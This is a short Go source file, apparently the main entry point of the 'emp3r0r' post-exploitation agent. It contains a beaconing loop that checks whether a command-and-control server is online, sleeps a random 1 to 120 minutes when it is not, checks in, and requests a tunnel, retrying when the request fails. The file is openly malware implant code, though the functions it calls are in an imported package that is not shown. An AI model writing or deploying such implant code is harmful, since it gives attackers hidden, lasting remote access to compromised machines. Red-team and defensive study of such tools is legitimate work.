package main

import (
	"fmt"
	"log"
	"os"
	"time"

	"github.com/jm33-m0/emp3r0r/emagent/internal/agent"
)

func main() {
	fmt.Println("emp3r0r agent started")
	log.SetOutput(os.Stderr)

connect:
	if !agent.IsCCOnline() {
		time.Sleep(time.Duration(agent.RandInt(1, 120)) * time.Minute)
	}

	err := agent.CheckIn()
	if err != nil {
		log.Println("CheckIn: ", err)
	}

	err = agent.RequestTun()
	if err != nil {
		log.Println("RequestTun: ", err)
		time.Sleep(5 * time.Second)
		goto connect
	}
}
